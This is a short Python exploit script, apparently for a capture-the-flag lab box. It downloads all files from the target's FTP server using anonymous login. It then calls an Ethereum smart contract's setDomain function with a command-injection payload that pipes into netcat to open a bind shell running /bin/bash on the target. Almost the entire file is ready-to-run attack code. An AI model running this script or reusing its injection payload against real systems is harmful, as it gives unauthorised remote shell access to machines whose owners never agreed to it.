#!/usr/bin/python3
# -*- coding: utf-8 -*-
import json, subprocess
import netifaces as ni
from web3 import Web3
from sys import exit
import os, ftplib

# TODO: Modify accordingly
TARGET_IP = '192.168.1.13'
NET_IFACE = 'wlan0'

def run_exploit(ip):
	# Store Ethereum contract address
	caddress = open('address.txt', 'r').read()
	caddress = caddress.replace('\n', '')

	# Store Ethereum contract configuration
	with open('WeaponizedPing.json') as f:
		contractData = json.load(f)

	# Establish a connection with the Ethereum RPC client
	w3 = Web3(Web3.HTTPProvider('http://{}:9810'.format(TARGET_IP)))
	w3.eth.defaultAccount = w3.eth.accounts[0]

	# Fetch Application Binary Interface (ABI) and Ethereum bytecode
	Url = w3.eth.contract(abi=contractData['abi'], bytecode=contractData['bytecode'])
	contractInstance = w3.eth.contract(address=caddress, abi=contractData['abi'])

	# Calling the function of contract to set a new domain
	url = contractInstance.functions.setDomain('192.168.1.8 | nc -lvnp 9292 -e /bin/bash'.format(ip)).transact()

	print(contractInstance.functions.getDomain().call())

def getFiles():
	ftp = ftplib.FTP(TARGET_IP)
	ftp.login('anonymous', 'chainsaw')

	filenames = ftp.nlst()

	for filename in filenames:
		if os.path.exists(filename):
			os.remove(filename)
		file = open(filename, 'wb')
		ftp.retrbinary('RETR '+ filename, file.write)

		file.close()

	ftp.quit()

if __name__ == '__main__':
	try:
		ni.ifaddresses(NET_IFACE)
		ip = ni.ifaddresses(NET_IFACE)[ni.AF_INET][0]['addr']
	except:
		print('[*] Failed to fetch local IP address. Exiting...')
		exit()

	getFiles()
	run_exploit(ip)
